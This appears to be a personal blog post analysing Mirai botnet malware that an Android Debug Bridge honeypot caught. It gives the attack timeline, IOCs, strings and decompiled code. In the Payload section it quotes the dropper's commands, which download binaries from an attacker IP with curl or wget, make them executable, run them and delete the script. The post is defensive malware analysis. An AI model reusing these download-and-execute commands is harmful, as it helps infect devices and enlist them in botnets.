---
slug: mirai
title: Analysis of Mirari Malware
authors: nathan
tags: [honeypot, reversing, malware]
sidebar_position: 1
image: https://m.media-amazon.com/images/I/41ZJaKEDzNL._AC_SX355_.jpg
---

## Intro 
I recently found out Google Cloud offers $300 for first time users, so I figured what better way to spend that than deploying a honeypot? While this blog post won't go into detail on deploying one yourself (keep at eye on my [docs](/docs/welcome) for a that) it will go into detail analyzing a malware sample that I discovered being deployed against it.

<!--truncate-->

## Timeline and Recon
On January 4th 2022 at ~20:30 UTC my honeypot deployed in Oregon was attacked by 205.185.123.62 hosted in [Las Vegas, Nevada.](https://www.iplocationtools.com/205.185.123.62)  It's hosted by "Frantech Solutions" which a cursoury google search gives results such as "FranTech Solutions is **a high fraud risk ISP**.." and [scamalytics](https://scamalytics.com/ip/isp/frantech-solutions) gives it a score of 64.

My honeypot was attacked a total of 24 times from this IP address. Starting at 20:30 UTC and ending at 11:00 UTC. 

## Attack Vector
This attack was caught by the [ADBHoney](https://github.com/huuck/ADBHoney) service running on my honeypot. ADBHoney describes itself as a "Low interaction honeypot designed for Android Debug Bridge over TCP/IP." Now I have some experience with ADB in a pior CTF so I understood a small bit of what this honeypot does. ADB is the Andriod Debug Bridge. It's essentially a protocol/tool that allows developers to communicate with andriod devices. It's used prominately in the emulation part of Andriod Studio. Unfortunately for us, the TCP section of the ADB protocol **does not** have any kind of authentication, leaving it open to attacks. This is what the honeypot sets up to gather samples.

## Payload

![image](/img/mirai/initial_payload.png)
*Figure 1: Inital Attack*

As we can see in Figure 1, the inital attack involves moving into the tmp directory, using [busybox](https://busybox.net/) to execute wget to get another sample and executes it. It repeats this twice, opting for curl for the second sample. Switching tools like that is common in malware droppers, allowing it to be ran on more hosts. A potential target could be missing either curl or wget, but missing both would be unlikely. Both **w.sh** and **c.sh** are essentially the same file as seen below. The only difference being what tool is used to download the next stage.


![image](/img/mirai/wget.png)
*Figure 2: wget method*

![image](/img/mirai/curl.png)
*Figure 3: curl method*

Here we can see how the actual malware sample is being downloaded. What makes this particular malware sample interesting is how it has different exectuables for a large set of instruction sets, ranging from ARM to SH4 to MIPS and even sparc. The first part of each line is downloading the malware `curl htt[p]s://209.141.33.122/arm`, then setting it as executable `chmod 777 arm`, then executing it with the argument of "android" `./arm android`. The final part of the script `rm $0` is deleting the script that was just ran in an effort to evade analysis. 

## Detection Rate and VirusTotal

Uploading the MIPS sample to [VirusTotal](https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection) gives it a detection ratio of 36/56 and most AV vendors classify this sample as belonging to the [Mirai](https://en.wikipedia.org/wiki/Mirai_(malware)) botnet. It was first seen on December 29th, 2021.  

VirusTotal Link: https://www.virustotal.com/gui/file/10a5fabf1847feb44437827b040f707b432b3cc93167720fe9879ca33477d5c1/detection  

## IOCs
If you see network activity to these IPs/Domains or system activity relating to them, you might be infected.  
IPs: 209.141.33.122  
Domains: bots1.firewalla1337.cc, scan1.firewalla1337.cc  
System Activity: Creation of binaries in `/data/local/tmp` with the names of common instruction sets. Execution of binaries with the argument of `android`.  
## Analysis

Note: My reversing skills are still in its infancy, so please bear with me.

The first thing I did to this binary was run strings against it. This gave me some interesting findings seen below:

### Strings
`/dev/null`  
`POST /cdn-cgi/`   
`HTTP/1.1\r\nUser-Agent:`   
`\r\nHost:`   
`Cookie: `    
`bots1.firewalla1337.cc`   
`209.141.33.122`   
`abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678`   
`dadlcldadg`    
`scan1.firewalla1337.cc`    

Lets open this sample in ghidra and look into it a bit further.

The only function I could make sense of was what to me looks like a domain resolution function here:
```c
void FUN_00410544(void)

{
  byte *pbVar1;
  uint uVar2;
  undefined2 *puVar3;
  int iVar4;
  
  pbVar1 = (byte *)FUN_00411908("bot[s]1.firewalla1337.cc");
  if (pbVar1 != (byte *)0x0) {
    iVar4 = *(int *)(pbVar1 + 4);
    uVar2 = FUN_00411518();
    if (*pbVar1 == 0) {
      trap(0x1c00);
    }
    DAT_0045d784 = *(undefined4 *)((uVar2 % (uint)*pbVar1) * 4 + iVar4);
    FUN_0041189c(pbVar1);
    FUN_00414e24(1);
    puVar3 = (undefined2 *)FUN_00414d0c(1,0);
    DAT_0045d782 = *puVar3;
                    /* WARNING: Could not recover jumptable at 0x00410634. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    FUN_00414d40(1);
    return;
  }
  DAT_0045d784 = FUN_00417c20("209.1[4]1.33.122");
  return;
}
```
*Brackets in IP address and Domain added by myself*

Both the domain name and IP address are hardcoded, but these are both the same address of the machine where the attack originated from meaning we dont have the C2's address.

There are references to POSTs and setting URL variables in the malware which tells me that's most likely the way communication is handled between the C2 and the bots.  

## Closing Thoughts

Unfortunately this is the extent of my analysis of this sample. My reversing skills arent where they should be in order to properly reverse this sample. I would try dynamic analysis and see what domains/IPs this sample tries to contact, but the x86 version was not available and I do not have any spare system capable of executing the other instruction sets besides my Raspberry Pi4s, so lookout for a potential part 2 of this post where I execute the malware in a lab environment.

Thank you so much for reading this post. I learned a lot while investigating this sample and hopefully you learned something new reading this blog post. I hope to post more about my activities with my honeypot so keep an eye out for those posts when they drop.   

As always, if you have any feedback please don't hesitate to contact me at [my email.](mailto:nathan@nburns.tech?Subject=Reverse_Blogpost)

Nathan Burns